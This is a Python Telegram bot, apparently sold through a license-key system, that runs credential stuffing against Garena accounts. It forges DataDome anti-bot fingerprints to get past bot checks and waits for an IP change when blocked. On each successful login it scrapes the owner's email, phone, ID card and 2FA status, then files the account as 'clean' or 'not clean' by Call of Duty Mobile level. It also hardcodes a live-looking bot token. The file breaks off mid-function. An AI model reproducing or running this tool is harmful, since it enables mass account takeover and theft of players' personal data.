# BOT CHECKER ENHANCED VERSION WITH KEY SYSTEM
# Owner: @ItsMeJeff
# Credits: @DevXyto (original base)

import os
import sys
import time
import random
import hashlib
from datetime import datetime, timezone, timedelta
import json
import logging
import urllib.parse
import signal
import threading
from threading import Lock, Event
import uuid
from Crypto.Cipher import AES
import requests
import cloudscraper
import telebot
from telebot import types
import html

# Configuration 
BOT_TOKEN = "8312173818:AAFGssLiaiFmHwepfFDYdyOBX6hsfGPHv1w"
ADMIN_IDS = [8332249154]  # list of admin user IDs
bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)  
user_sessions = {}
user_locks = {}
global_lock = Lock()

logging.basicConfig(level=logging.ERROR)
logger = logging.getLogger(__name__)
logging.getLogger("urllib3").setLevel(logging.ERROR)
logging.getLogger("requests").setLevel(logging.ERROR)

# ------------------ KEY MANAGER ------------------

KEYS_FILE = "keys.json"

class KeyManager:
    def __init__(self):
        self.keys = {}
        self.load_keys()

    def load_keys(self):
        if os.path.exists(KEYS_FILE):
            with open(KEYS_FILE, 'r') as f:
                self.keys = json.load(f)
        else:
            self.keys = {}

    def save_keys(self):
        with open(KEYS_FILE, 'w') as f:
            json.dump(self.keys, f, indent=2)

    def generate_key(self, days=0, daily_limit=0, usage_limit=1):
        """Generate a new key.
        days: 0 = lifetime, else number of days validity
        daily_limit: max lines per day (0 = unlimited)
        usage_limit: how many users can use this key (1 = single user)
        """
        key = str(uuid.uuid4()).replace('-', '')[:16].upper()
        created = datetime.now().isoformat()
        expires = None if days == 0 else (datetime.now() + timedelta(days=days)).isoformat()
        self.keys[key] = {
            "key": key,
            "created": created,
            "expires": expires,
            "daily_limit": daily_limit,
            "usage_limit": usage_limit,
            "used_by": [],            # list of user_ids who used it
            "usage_history": {}       # date -> count used that day
        }
        self.save_keys()
        return key

    def delete_key(self, key):
        key = key.strip().upper()
        if key in self.keys:
            del self.keys[key]
            self.save_keys()
            return True
        return False

    def validate_key(self, key, user_id):
        """Check if key is valid for the user.
        Returns (is_valid, message, daily_remaining)
        """
        key = key.strip().upper()
        if key not in self.keys:
            return False, "❌ Invalid key.", 0

        kdata = self.keys[key]

        # Check expiration
        if kdata.get("expires"):
            exp = datetime.fromisoformat(kdata["expires"])
            if datetime.now() > exp:
                return False, "❌ Key expired.", 0

        # Check usage limit (how many distinct users)
        used_by = kdata.get("used_by", [])
        if len(used_by) >= kdata.get("usage_limit", 1) and user_id not in used_by:
            return False, "❌ Key usage limit reached.", 0

        # Check daily limit
        today = datetime.now().strftime("%Y-%m-%d")
        used_today = kdata.get("usage_history", {}).get(today, 0)
        daily_limit = kdata.get("daily_limit", 0)
        remaining = daily_limit - used_today if daily_limit > 0 else float('inf')

        if daily_limit > 0 and used_today >= daily_limit:
            return False, f"❌ Daily limit ({daily_limit}) reached for this key.", 0

        return True, "✅ Key valid.", remaining

    def record_usage(self, key, user_id, lines_checked):
        """Record that key was used by user_id for lines_checked accounts."""
        key = key.strip().upper()
        if key not in self.keys:
            return
        kdata = self.keys[key]
        if user_id not in kdata["used_by"]:
            kdata["used_by"].append(user_id)
        today = datetime.now().strftime("%Y-%m-%d")
        kdata["usage_history"][today] = kdata["usage_history"].get(today, 0) + lines_checked
        self.save_keys()

    def list_keys(self):
        return self.keys

key_manager = KeyManager()

# ------------------ HELPER FUNCTIONS (unchanged) ------------------

def safe_html(text):
    if text is None:
        return "N/A"
    return html.escape(str(text))

def encode(plaintext, key):
    key = bytes.fromhex(key)
    plaintext = bytes.fromhex(plaintext)
    cipher = AES.new(key, AES.MODE_ECB)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext.hex()[:32]

def get_passmd5(password):
    decoded_password = urllib.parse.unquote(password)
    return hashlib.md5(decoded_password.encode('utf-8')).hexdigest()

def hash_password(password, v1, v2):
    passmd5 = get_passmd5(password)
    inner_hash = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
    outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
    return encode(passmd5, outer_hash)

class CookieManager:
    def __init__(self):
        self.banned_cookies = set()
        self.load_banned_cookies()

    def load_banned_cookies(self):
        if os.path.exists('banned_cookies.txt'):
            with open('banned_cookies.txt', 'r') as f:
                self.banned_cookies = set(line.strip() for line in f if line.strip())

    def is_banned(self, cookie):
        return cookie in self.banned_cookies

    def mark_banned(self, cookie):
        self.banned_cookies.add(cookie)
        with open('banned_cookies.txt', 'a') as f:
            f.write(cookie + '\n')

    def get_valid_cookies(self):
        valid_cookies = []
        if os.path.exists('fresh_cookie.txt'):
            with open('fresh_cookie.txt', 'r') as f:
                valid_cookies = [c.strip() for c in f.read().splitlines()
                                 if c.strip() and not self.is_banned(c.strip())]
        random.shuffle(valid_cookies)
        return valid_cookies

    def save_cookie(self, datadome_value):
        formatted_cookie = f"datadome={datadome_value.strip()}"
        if not self.is_banned(formatted_cookie):
            existing_cookies = set()
            if os.path.exists('fresh_cookie.txt'):
                with open('fresh_cookie.txt', 'r') as f:
                    existing_cookies = set(line.strip() for line in f if line.strip())
            if formatted_cookie not in existing_cookies:
                with open('fresh_cookie.txt', 'a') as f:
                    f.write(formatted_cookie + '\n')
                return True
        return False

class DataDomeManager:
    def __init__(self):
        self.current_datadome = None
        self.datadome_history = []
        self._403_attempts = 0

    def set_datadome(self, datadome_cookie):
        if datadome_cookie and datadome_cookie != self.current_datadome:
            self.current_datadome = datadome_cookie
            self.datadome_history.append(datadome_cookie)
            if len(self.datadome_history) > 10:
                self.datadome_history.pop(0)

    def get_datadome(self):
        return self.current_datadome

    def extract_datadome_from_session(self, session):
        try:
            cookies_dict = session.cookies.get_dict()
            datadome_cookie = cookies_dict.get('datadome')
            if datadome_cookie:
                self.set_datadome(datadome_cookie)
                return datadome_cookie
            return None
        except:
            return None

    def clear_session_datadome(self, session):
        try:
            if 'datadome' in session.cookies:
                del session.cookies['datadome']
        except:
            pass

    def set_session_datadome(self, session, datadome_cookie=None):
        try:
            self.clear_session_datadome(session)
            cookie_to_use = datadome_cookie or self.current_datadome
            if cookie_to_use:
                session.cookies.set('datadome', cookie_to_use, domain='.garena.com')
                return True
            return False
        except:
            return False

    def get_current_ip(self):
        ip_services = [
            'https://api.ipify.org',
            'https://icanhazip.com',
            'https://ident.me',
            'https://checkip.amazonaws.com'
        ]
        for service in ip_services:
            try:
                response = requests.get(service, timeout=10)
                if response.status_code == 200:
                    ip = response.text.strip()
                    if ip and '.' in ip:
                        return ip
            except:
                continue
        return None

    def wait_for_ip_change(self, session, check_interval=5, max_wait_time=200):
        original_ip = self.get_current_ip()
        if not original_ip:
            time.sleep(10)
            return True
        start_time = time.time()
        while time.time() - start_time < max_wait_time:
            current_ip = self.get_current_ip()
            if current_ip and current_ip != original_ip:
                return True
            time.sleep(check_interval)
        return False

    def handle_403(self, session):
        self._403_attempts += 1
        if self._403_attempts >= 3:
            if self.wait_for_ip_change(session):
                self._403_attempts = 0
                new_datadome = get_datadome_cookie(session)
                if new_datadome:
                    self.set_datadome(new_datadome)
                    return True
                return False
            return False
        return False

class LiveStats:
    def __init__(self):
        self.valid_count = 0
        self.invalid_count = 0
        self.clean_count = 0
        self.not_clean_count = 0
        self.has_codm_count = 0
        self.no_codm_count = 0
        self.total_processed = 0
        self.lock = threading.Lock()

    def update_stats(self, valid=False, clean=False, has_codm=False):
        with self.lock:
            self.total_processed += 1
            if valid:
                self.valid_count += 1
                if clean:
                    self.clean_count += 1
                else:
                    self.not_clean_count += 1
                if has_codm:
                    self.has_codm_count += 1
                else:
                    self.no_codm_count += 1
            else:
                self.invalid_count += 1

    def get_stats(self):
        with self.lock:
            return {
                'valid': self.valid_count,
                'invalid': self.invalid_count,
                'clean': self.clean_count,
                'not_clean': self.not_clean_count,
                'has_codm': self.has_codm_count,
                'no_codm': self.no_codm_count,
                'total': self.total_processed
            }

    def format_stats_telegram(self):
        stats = self.get_stats()
        success_rate = (stats['valid'] / stats['total'] * 500) if stats['total'] > 0 else 0
        text = (
            "📊 LIVE STATISTICS\n"
            "===========================\n"
            f"📈 Processed: {stats['total']} | ✅ Rate: {success_rate:.1f}%\n"
            "===========================\n"
            f"✅ Valid: {stats['valid']} | ❌ Invalid: {stats['invalid']}\n"
            f"🧼 Clean: {stats['clean']} | ⚠️ Not Clean: {stats['not_clean']}\n"
            f"🎮 CODM: {stats['has_codm']} | 🚫 No CODM: {stats['no_codm']}\n"
            "==========================="
        )
        return text

def applyck(session, cookie_str):
    session.cookies.clear()
    cookie_dict = {}
    for item in cookie_str.split(";"):
        item = item.strip()
        if '=' in item:
            try:
                key, value = item.split("=", 1)
                key = key.strip()
                value = value.strip()
                if key and value:
                    cookie_dict[key] = value
            except:
                pass
    if cookie_dict:
        session.cookies.update(cookie_dict)

def get_datadome_cookie(session):
    url = 'https://dd.garena.com/js/'
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com',
        'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
    }

    payload = {
        "jsData": json.dumps({
            "ttst": 76.70000004768372, "ifov": False, "hc": 4, "br_oh": 824, "br_ow": 1536,
            "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "wbd": False, "dp0": True, "tagpu": 5.738121195951787, "wdif": False, "wdifrm": False,
            "npmtm": False, "br_h": 738, "br_w": 260, "isf": False, "nddc": 1, "rs_h": 864,
            "rs_w": 1536, "rs_cd": 24, "phe": False, "nm": False, "jsf": False, "lg": "en-US",
            "pr": 1.25, "ars_h": 824, "ars_w": 1536, "tz": -480, "str_ss": True, "str_ls": True,
            "str_idb": True, "str_odb": False, "plgod": False, "plg": 5, "plgne": True,
            "plgre": True, "plgof": False, "plggt": False, "pltod": False, "hcovdr": False,
            "hcovdr2": False, "plovdr": False, "plovdr2": False, "ftsovdr": False, "ftsovdr2": False,
            "lb": False, "eva": 33, "lo": False, "ts_mtp": 0, "ts_tec": False, "ts_tsa": False,
            "vnd": "Google Inc.", "bid": "NA",
            "mmt": "application/pdf,text/pdf",
            "plu": "PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF",
            "hdn": False, "awe": False, "geb": False, "dat": False, "med": "defined",
            "aco": "probably", "acots": False, "acmp": "probably", "acmpts": True,
            "acw": "probably", "acwts": False, "acma": "maybe", "acmats": False,
            "acaa": "probably", "acaats": True, "ac3": "", "ac3ts": False, "acf": "probably",
            "acfts": False, "acmp4": "maybe", "acmp4ts": False, "acmp3": "probably",
            "acmp3ts": False, "acwm": "maybe", "acwmts": False, "ocpt": False, "vco": "",
            "vcots": False, "vch": "probably", "vchts": True, "vcw": "probably", "vcwts": True,
            "vc3": "maybe", "vc3ts": False, "vcmp": "", "vcmpts": False, "vcq": "maybe",
            "vcqts": False, "vc1": "probably", "vc1ts": True, "dvm": 8, "sqt": False,
            "so": "landscape-primary", "bda": False, "wdw": True, "prm": True, "tzp": True,
            "cvs": True, "usb": True, "cap": True, "tbf": False, "lgs": True, "tpd": True
        }),
        'eventCounters': '[]',
        'jsType': 'ch',
        'cid': 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
        'ddk': 'AE3F04AD3F0D3A462481A337485081',
        'Referer': 'https://account.garena.com/',
        'request': '/',
        'responsePage': 'origin',
        'ddv': '4.35.4'
    }

    data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())

    try:
        response = requests.post(url, headers=headers, data=data)
        response.raise_for_status()
        response_json = response.json()
        if response_json.get('status') == 200 and 'cookie' in response_json:
            cookie_string = response_json['cookie']
            datadome = cookie_string.split(';')[0].split('=')[1]
            return datadome
        return None
    except:
        return None

def prelogin(session, account, datadome_manager):
    try:
        account.encode('latin-1')
    except UnicodeEncodeError:
        return None, None, None

    url = 'https://sso.garena.com/api/prelogin'
    params = {
        'app_id': '10100',
        'account': account,
        'format': 'json',
        'id': str(int(time.time() * 1000))
    }

    retries = 3
    for attempt in range(retries):
        try:
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
                if cookie_name in current_cookies:
                    cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''

            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br, zstd',
                'accept-language': 'en-US,en;q=0.9',
                'connection': 'keep-alive',
                'host': 'sso.garena.com',
                'referer': 'https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-SG&account=' + urllib.parse.quote(account),
                'sec-ch-ua': '"Google Chrome";v="133", "Chromium";v="133", "Not=A?Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'
            }
            if cookie_header:
                headers['cookie'] = cookie_header

            response = session.get(url, headers=headers, params=params, timeout=30)

            new_cookies = {}
            if 'set-cookie' in response.headers:
                set_cookie_header = response.headers['set-cookie']
                for cookie_str in set_cookie_header.split(','):
                    if '=' in cookie_str:
                        try:
                            cname = cookie_str.split('=')[0].strip()
                            cvalue = cookie_str.split('=')[1].split(';')[0].strip()
                            if cname and cvalue:
                                new_cookies[cname] = cvalue
                        except:
                            pass

            try:
                response_cookies = response.cookies.get_dict()
                for cn, cv in response_cookies.items():
                    if cn not in new_cookies:
                        new_cookies[cn] = cv
            except:
                pass

            for cn, cv in new_cookies.items():
                if cn in ['datadome', 'apple_state_key', 'sso_key']:
                    session.cookies.set(cn, cv, domain='.garena.com')
                    if cn == 'datadome':
                        datadome_manager.set_datadome(cv)

            new_datadome = new_cookies.get('datadome')

            if response.status_code == 403:
                if new_cookies and attempt < retries - 1:
                    time.sleep(2)
                    continue
                if datadome_manager.handle_403(session):
                    return "IP_BLOCKED", None, None
                return None, None, new_datadome

            response.raise_for_status()

            try:
                data = response.json()
            except json.JSONDecodeError:
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return None, None, new_datadome

            if 'error' in data:
                return None, None, new_datadome

            v1 = data.get('v1')
            v2 = data.get('v2')

            if not v1 or not v2:
                return None, None, new_datadome

            return v1, v2, new_datadome

        except requests.exceptions.HTTPError as e:
            if hasattr(e, 'response') and e.response is not None:
                if e.response.status_code == 403:
                    new_cookies = {}
                    if 'set-cookie' in e.response.headers:
                        for cookie_str in e.response.headers['set-cookie'].split(','):
                            if '=' in cookie_str:
                                try:
                                    cn = cookie_str.split('=')[0].strip()
                                    cv = cookie_str.split('=')[1].split(';')[0].strip()
                                    if cn and cv:
                                        new_cookies[cn] = cv
                                        session.cookies.set(cn, cv, domain='.garena.com')
                                        if cn == 'datadome':
                                            datadome_manager.set_datadome(cv)
                                except:
                                    pass
                    if new_cookies and attempt < retries - 1:
                        time.sleep(2)
                        continue
                    if datadome_manager.handle_403(session):
                        return "IP_BLOCKED", None, None
                    return None, None, new_cookies.get('datadome')

            if attempt < retries - 1:
                time.sleep(2)
                continue
        except Exception:
            if attempt < retries - 1:
                time.sleep(2)

    return None, None, None

def do_login(session, account, password, v1, v2):
    hashed_password = hash_password(password, v1, v2)
    url = 'https://sso.garena.com/api/login'
    params = {
        'app_id': '10100',
        'account': account,
        'password': hashed_password,
        'redirect_uri': 'https://account.garena.com/',
        'format': 'json',
        'id': str(int(time.time() * 1000))
    }

    current_cookies = session.cookies.get_dict()
    cookie_parts = []
    for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
        if cookie_name in current_cookies:
            cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
    cookie_header = '; '.join(cookie_parts) if cookie_parts else ''

    headers = {
        'accept': 'application/json, text/plain, */*',
        'referer': 'https://account.garena.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
    }
    if cookie_header:
        headers['cookie'] = cookie_header

    retries = 3
    for attempt in range(retries):
        try:
            response = session.get(url, headers=headers, params=params, timeout=30)
            response.raise_for_status()

            login_cookies = {}
            if 'set-cookie' in response.headers:
                for cookie_str in response.headers['set-cookie'].split(','):
                    if '=' in cookie_str:
                        try:
                            cn = cookie_str.split('=')[0].strip()
                            cv = cookie_str.split('=')[1].split(';')[0].strip()
                            if cn and cv:
                                login_cookies[cn] = cv
                        except:
                            pass
            try:
                rc = response.cookies.get_dict()
                for cn, cv in rc.items():
                    if cn not in login_cookies:
                        login_cookies[cn] = cv
            except:
                pass

            for cn, cv in login_cookies.items():
                if cn in ['sso_key', 'apple_state_key', 'datadome']:
                    session.cookies.set(cn, cv, domain='.garena.com')

            try:
                data = response.json()
            except json.JSONDecodeError:
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return None

            if 'error' in data:
                return None

            sso_key = login_cookies.get('sso_key') or response.cookies.get('sso_key')
            return sso_key

        except requests.RequestException:
            if attempt < retries - 1:
                time.sleep(2)

    return None

def get_codm_access_token(session):
    try:
        random_id = str(int(time.time() * 1000))
        token_url = "https://auth.garena.com/oauth/token/grant"
        token_headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": "https://auth.garena.com/"
        }
        token_data = "client_id=100082&response_type=token&redirect_uri=https%3A%2F%2Fauth.codm.garena.com%2Fauth%2Fauth%2Fcallback_n%3Fsite%3Dhttps%3A%2F%2Fapi-delete-request.codm.garena.co.id%2Foauth%2Fcallback%2F&format=json&id=" + random_id
        token_response = session.post(token_url, headers=token_headers, data=token_data)
        td = token_response.json()
        return td.get("access_token", "")
    except:
        return ""

def process_codm_callback(session, access_token):
    try:
        codm_callback_url = "https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/&access_token=" + access_token
        callback_headers = {
            "authority": "auth.codm.garena.com",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "referer": "https://auth.garena.com/",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        session.get(codm_callback_url, headers=callback_headers, allow_redirects=False)

        api_callback_url = "https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token=" + access_token
        api_callback_headers = {
            "authority": "api-delete-request.codm.garena.co.id",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "referer": "https://auth.garena.com/",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        api_callback_response = session.get(api_callback_url, headers=api_callback_headers, allow_redirects=False)
        location = api_callback_response.headers.get("Location", "")

        if "err=3" in location:
            return None, "no_codm"
        elif "token=" in location:
            token = location.split("token=")[-1].split('&')[0]
            return token, "success"
        else:
            return None, "unknown_error"
    except:
        return None, "error"

def get_codm_user_info(session, token):
    try:
        check_login_url = "https://api-delete-request.codm.garena.co.id/oauth/check_login/"
        check_headers = {
            "authority": "api-delete-request.codm.garena.co.id",
            "accept": "application/json, text/plain, */*",
            "codm-delete-token": token,
            "origin": "https://delete-request.codm.garena.co.id",
            "referer": "https://delete-request.codm.garena.co.id/",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
        }
        check_response = session.get(check_login_url, headers=check_headers)
        check_data = check_response.json()
        user_data = check_data.get("user", {})
        if user_data:
            return {
                "codm_nickname": user_data.get("codm_nickname", "N/A"),
                "codm_level": user_data.get("codm_level", "N/A"),
                "region": user_data.get("region", "N/A"),
                "uid": user_data.get("uid", "N/A"),
                "open_id": user_data.get("open_id", "N/A"),
                "t_open_id": user_data.get("t_open_id", "N/A")
            }
        return {}
    except:
        return {}

def check_codm_account(session, account):
    codm_info = {}
    has_codm = False
    try:
        access_token = get_codm_access_token(session)
        if not access_token:
            return has_codm, codm_info
        codm_token, status = process_codm_callback(session, access_token)
        if status == "no_codm":
            return has_codm, codm_info
        elif status != "success" or not codm_token:
            return has_codm, codm_info
        codm_info = get_codm_user_info(session, codm_token)
        if codm_info:
            has_codm = True
    except:
        pass
    return has_codm, codm_info

def parse_account_details(data):
    user_info = data.get('user_info', {})
    account_info = {
        'uid': user_info.get('uid', 'N/A'),
        'username': user_info.get('username', 'N/A'),
        'nickname': user_info.get('nickname', 'N/A'),
        'email': user_info.get('email', 'N/A'),
        'email_verified': bool(user_info.get('email_v', 0)),
        'security': {
            'password_strength': user_info.get('password_s', 'N/A'),
            'two_step_verify': bool(user_info.get('two_step_verify_enable', 0)),
            'authenticator_app': bool(user_info.get('authenticator_enable', 0)),
            'facebook_connected': bool(user_info.get('is_fbconnect_enabled', False)),
            'facebook_account': user_info.get('fb_account', None),
            'suspicious': bool(user_info.get('suspicious', False))
        },
        'personal': {
            'real_name': user_info.get('realname', 'N/A'),
            'id_card': user_info.get('idcard', 'N/A'),
            'country': user_info.get('acc_country', 'N/A'),
            'country_code': user_info.get('country_code', 'N/A'),
            'mobile_no': user_info.get('mobile_no', 'N/A'),
        },
        'profile': {
            'avatar': user_info.get('avatar', 'N/A'),
            'shell_balance': user_info.get('shell', 0)
        },
        'status': {
            'account_status': "Active" if user_info.get('status', 0) == 1 else "Inactive",
        },
        'binds': [],
    }

    email = account_info['email']
    if email != 'N/A' and email and not email.startswith('***') and '@' in email and '****' not in email:
        account_info['binds'].append('Email')
    mobile_no = account_info['personal']['mobile_no']
    if mobile_no != 'N/A' and mobile_no and str(mobile_no).strip():
        account_info['binds'].append('Phone')
    if account_info['security']['facebook_connected']:
        account_info['binds'].append('Facebook')
    id_card = account_info['personal']['id_card']
    if id_card != 'N/A' and id_card and str(id_card).strip():
        account_info['binds'].append('ID Card')
    if user_info.get('email_v', 0) == 1 or len(account_info['binds']) > 0:
        account_info['is_clean'] = False
        bind_list = ', '.join(account_info['binds']) if account_info['binds'] else 'Email Verified'
        account_info['bind_status'] = "Bound (" + bind_list + ")"
    else:
        account_info['is_clean'] = True
        account_info['bind_status'] = "Clean"

    return account_info

def save_codm_account(account, password, codm_info, country='N/A', is_clean=False, result_folder='Results'):
    try:
        if not codm_info:
            return
        codm_level = int(codm_info.get('codm_level', 0))
        region = codm_info.get('region', 'N/A').upper()
        nickname = codm_info.get('codm_nickname', 'N/A')
        if isinstance(country, dict):
            country_code = country.get('country', 'N/A').upper() if country.get('country') else region
        else:
            country_code = country.upper() if country and country != 'N/A' else region
        if country_code == 'N/A' or not country_code or country_code == 'NONE':
            country_code = region if region and region != 'N/A' else 'UNKNOWN'

        if codm_level <= 50:
            level_range = "1-50"
        elif codm_level <= 100:
            level_range = "51-100"
        elif codm_level <= 150:
            level_range = "101-150"
        elif codm_level <= 200:
            level_range = "151-200"
        elif codm_level <= 250:
            level_range = "201-250"
        elif codm_level <= 300:
            level_range = "251-300"
        elif codm_level <= 350:
            level_range = "301-350"
        else:
            level_range = "351+"

        clean_folder = "Clean" if is_clean else "NotClean"
        folder_path = os.path.join(result_folder, clean_folder, country_code)
        os.makedirs(folder_path, exist_ok=True)
        level_file = os.path.join(folder_path, level_range + "_accounts.txt")

        account_exists = False
        if os.path.exists(level_file):
            with open(level_file, "r", encoding="utf-8") as f:
                if account in f.read():
                    account_exists = True
        if not account_exists:
            with open(level_file, "a", encoding="utf-8") as f:
                f.write("{}:{} | Level: {} | Nickname: {} | Region: {} | UID: {}\n".format(
                    account, password, codm_level, nickname, region, codm_info.get('uid', 'N/A')
                ))
    except:
        pass

def save_clean_or_notclean(account, password, details, codm_info, result_folder='Results'):
    try:
        os.makedirs(result_folder, exist_ok=True)
        codm_nickname = codm_info.get('codm_nickname', 'N/A') if codm_info else 'N/A'
        codm_uid = codm_info.get('uid', 'N/A') if codm_info else 'N/A'
        codm_level = codm_info.get('codm_level', 'N/A') if codm_info else 'N/A'
        username = details.get('username', account)
        email = details.get('email', 'N/A')
        email_ver = "Verified" if details.get('email_verified') else "Not Verified"
        mobile = details.get('personal', {}).get('mobile_no', 'N/A')
        mobile_bound = "Yes" if mobile and str(mobile).strip() else "No"
        fb_connected = "Linked" if details.get('security', {}).get('facebook_connected') else "Not Linked"
        shell = details.get('profile', {}).get('shell_balance', 'N/A')
        acc_country = details.get('personal', {}).get('country', 'N/A')
        authenticator_enabled = "Yes" if details.get('security', {}).get('authenticator_app') else "No"
        two_step_enabled = "Yes" if details.get('security', {}).get('two_step_verify') else "No"
        is_clean = details.get('is_clean', False)
        clean_status = "CLEAN" if is_clean else "NOT CLEAN"

        content_to_save = """
[LOGIN SUCCESSFUL]
=======================================
  [+] Username       : {}:{}
  [+] Country        : {}
  [+] Garena Shells  : {}
  [+] Mobile No      : {}
  [+] Email          : {} ({})
  [+] Facebook       : {}
  [+] CODM Nickname  : {}
  [+] CODM UID       : {}
  [+] CODM Level     : {}
  [+] Mobile Bound   : {}
  [+] Authenticator  : {}
  [+] 2FA Enabled    : {}
  [+] Account Status : {}
=======================================
""".format(
            username, password, acc_country, shell, mobile,
            email, email_ver, fb_connected, codm_nickname,
            codm_uid, codm_level, mobile_bound,
            authenticator_enabled, two_step_enabled, clean_status
        )

        if is_clean:
            file_path = os.path.join(result_folder, 'clean.txt')
        else:
            file_path = os.path.join(result_folder, 'notclean.txt')

        identifier = "  [+] Username       : {}:{}".format(username, password)
        account_exists = False
        if os.path.exists(file_path):
            with open(file_path, "r", encoding="utf-8") as f:
                if identifier in f.read():
                    account_exists = True
        if not account_exists:
            with open(file_path, "a", encoding="utf-8") as f:
                f.write(content_to_save.strip() + "\n\n")

        if codm_info and codm_info.get('codm_nickname') and codm_info.get('codm_nickname') != 'N/A':
            save_codm_account(account, password, codm_info, acc_country, is_clean, result_folder)
    except:
        pass

def save_account_details_full(account, details, codm_info=None, password=None, result_folder='Results'):
    try:
        os.makedirs(result_folder, exist_ok=True)
        codm_name = codm_info.get('codm_nickname', 'N/A') if codm_info else 'N/A'
        codm_uid = codm_info.get('uid', 'N/A') if codm_info else 'N/A'
        codm_region = codm_info.get('region', 'N/A') if codm_info else 'N/A'
        codm_level = codm_info.get('codm_level', 'N/A') if codm_info else 'N/A'
        is_clean = details.get('is_clean', False)

        with open(os.path.join(result_folder, 'full_details.txt'), 'a', encoding='utf-8') as f:
            f.write("=" * 60 + "\n")
            f.write("Account: {}\nPassword: {}\n".format(account, password))
            f.write("UID: {}\nUsername: {}\n".format(details['uid'], details['username']))
            f.write("Nickname: {}\nEmail: {}\n".format(details['nickname'], details['email']))
            f.write("Phone: {}\n".format(details['personal']['mobile_no']))
            f.write("Country: {}\n".format(details['personal']['country']))
            f.write("Shell Balance: {}\n".format(details['profile']['shell_balance']))
            f.write("Account Status: {}\n".format(details['status']['account_status']))
            f.write("Is Clean: {}\n".format(is_clean))
            if codm_info:
                f.write("CODM Name: {}\nCODM UID: {}\n".format(codm_name, codm_uid))
                f.write("CODM Region: {}\nCODM Level: {}\n".format(codm_region, codm_level))
            f.write("=" * 60 + "\n\n")
    except:
        pass

def processaccount(session, account, password, cookie_manager, datadome_manager, live_stats, result_folder='Results'):
    result = {
        'status': 'invalid',
        'message': '',
        'details': None,
        'codm_info': None,
        'has_codm': False
    }

    try:
        datadome_manager.clear_session_datadome(session)
        current_datadome = datadome_manager.get_datadome()
        if current_datadome:
            datadome_manager.set_session_datadome(session, current_datadome)

        v1, v2, new_datadome = prelogin(session, account, datadome_manager)

        if v1 == "IP_BLOCKED":
            result['status'] = 'ip_blocked'
            result['message'] = "IP Blocked - Change IP/VPN and retry"
            return result

        if not v1 or not v2:
            live_stats.update_stats(valid=False)
            result['message'] = "Prelogin failed - Invalid account or server error"
            return result

        if new_datadome:
            datadome_manager.set_datadome(new_datadome)
            datadome_manager.set_session_datadome(session, new_datadome)

        sso_key = do_login(session, account, password, v1, v2)

        if not sso_key:
            live_stats.update_stats(valid=False)
            result['message'] = "Login failed - Invalid credentials"
            return result

        current_cookies = session.cookies.get_dict()
        cookie_parts = []
        for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
            if cookie_name in current_cookies:
                cookie_parts.append("{}={}".format(cookie_name, current_cookies[cookie_name]))
        cookie_header = '; '.join(cookie_parts) if cookie_parts else ''

        headers = {
            'accept': '*/*',
            'referer': 'https://account.garena.com/',
